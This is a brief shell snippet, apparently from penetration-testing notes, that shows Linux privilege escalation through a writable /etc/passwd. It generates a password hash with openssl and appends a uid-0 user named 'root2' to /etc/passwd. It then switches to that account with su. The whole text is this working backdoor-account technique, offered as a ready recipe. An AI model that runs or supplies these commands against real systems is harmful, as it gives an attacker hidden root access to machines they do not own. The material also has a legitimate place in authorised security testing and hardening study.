#Writing to /etc/passwd
openssl passwd w00t    #Create a password
echo "root2:outputofpreviouscommand:0:0:root:/root:/bin/bash" >> /etc/passwd    #Create new user in passwd file using created password
su root2      #Elevate Privs with su


